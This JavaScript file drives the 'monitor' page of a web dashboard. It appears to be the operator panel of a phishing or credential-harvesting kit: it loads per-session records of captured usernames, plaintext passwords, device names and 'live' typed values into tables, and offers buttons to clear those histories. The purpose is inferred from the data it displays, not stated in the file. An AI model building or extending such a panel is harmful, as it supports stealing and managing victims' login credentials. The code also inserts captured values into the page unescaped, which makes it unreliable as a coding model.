// completed
let session = getcookie("userSession");
let cid = null;
if(session === null || session === ""){
 window.location = "login.html";
}
if(session){
  cid = session;
}

const loggedInTable = document.getElementById("loggedintable");
const liveTable = document.getElementById("livetable");
const moniLoggedIn = document.getElementById("moniloggedin");
const settingTable = document.getElementById("settingtable");
const moniLive = document.getElementById("monilive");
const moniSettings = document.getElementById("monisettings");
const clive = document.getElementById("clive");
const cloggedin = document.getElementById("cloggedin");

clive.addEventListener("click",(e) => {
  clearlive(cid);
  liveTable.innerHTML = `
       <tr>
      <th>type</th>
      <th>value</th>
      <th>device_name</th>
      <th>time</th>
      <th>date_of_submition</th>
    </tr>
   `;
});
cloggedin.addEventListener("click",(e) => {
  clearloggedin(cid);
  loggedInTable.innerHTML = `
       <tr>
      <th>username</th>
      <th>password</th>
      <th>device_name</th>
      <th>time</th>
      <th>date_of_submition</th>
    </tr>
   `;
});
getupdate(url + cid,updatePage);

function updatePage(data){
 const loginData = data.loggedin;
 const liveData = data.live;
 if(loginData.length !== 0){
   loggedInTable.innerHTML = `
       <tr>
      <th>username</th>
      <th>password</th>
      <th>device_name</th>
      <th>time</th>
      <th>date_of_submition</th>
    </tr>
   `;
   loginData.forEach(da => {
   const tr = document.createElement("tr");
   tr.innerHTML = `
   <td>${da.username}</td>
      <td>${da.password}</td>
      <td>${da.devicename}</td>
      <td>${da.time}</td>
      <td>${da.date}</td>`;
   loggedInTable.appendChild(tr);
 });
 }
 if(liveData.length !== 0){
   liveTable.innerHTML = `
       <tr>
      <th>type</th>
      <th>value</th>
      <th>device_name</th>
      <th>time</th>
      <th>date_of_submition</th>
    </tr>
   `;
   liveData.forEach(da => {
   const tr = document.createElement("tr");
   tr.innerHTML = `
   <td>${da.type}</td>
      <td>${da.value}</td>
      <td>${da.devicename}</td>
      <td>${da.time}</td>
      <td>${da.date}</td>`;
   liveTable.appendChild(tr);
 });
 }
 
}

moniLoggedIn.addEventListener("click",(e) => {
  loggedInTable.style.display = "block";
  liveTable.style.display = "none";
  settingTable.style.display = "none";
  moniLoggedIn.className = "active";
  moniLive.className = "";
  moniSettings.className = "";
});

moniLive.addEventListener("click",(e) => {
  liveTable.style.display = "block";
  loggedInTable.style.display = "none";
  settingTable.style.display = "none";
  moniLive.className = "active";
  moniLoggedIn.className = "";
  moniSettings.className = "";
});

moniSettings.addEventListener("click",(e) => {
  settingTable.style.display = "block";
  loggedInTable.style.display = "none";
  liveTable.style.display = "none";
  moniSettings.className = "active";
  moniLive.className = "";
  moniLoggedIn.className = "";
});


xnav_array = [
  {
    name: "dashboard",
    func: function (){
      window.location = "index.html";
    },
    current: false
  },
    {
    name: "monitor",
    func: null,
    current: true
  },
    {
    name: "log out",
    func: logout,
    current: false
  },
  ];
  
 xnav();

document.cookie = "userSession=user";

async function clearlive(id){
  const req = await fetch(url + id);
  if(!req.ok){
    alert("Failed! to clear live network error");
    throw new Error(`Error: ${req.status}`);
  }
  const res = await req.json();
  res.live = [];// reset live
  const updateReq = await fetch(url + id,{
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify(res)
  });
  if(!updateReq.ok){
    alert("Failed! to clear live network error");
    throw new Error(`Error: ${req.status}`);
  }
  
  alert("Live history cleared successful");
  
}

async function clearloggedin(id){
  const req = await fetch(url + id);
  if(!req.ok){
    alert("Failed! to clear loggedin network error");
    throw new Error(`Error: ${req.status}`);
  }
  const res = await req.json();
  res.loggedin = [];// reset loggedin
  const updateReq = await fetch(url + id,{
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify(res)
  });
  if(!updateReq.ok){
    alert("Failed! to clear loggedin network error");
    throw new Error(`Error: ${req.status}`);
  }
  
  alert("LoggedIn history cleared successful");
  
}
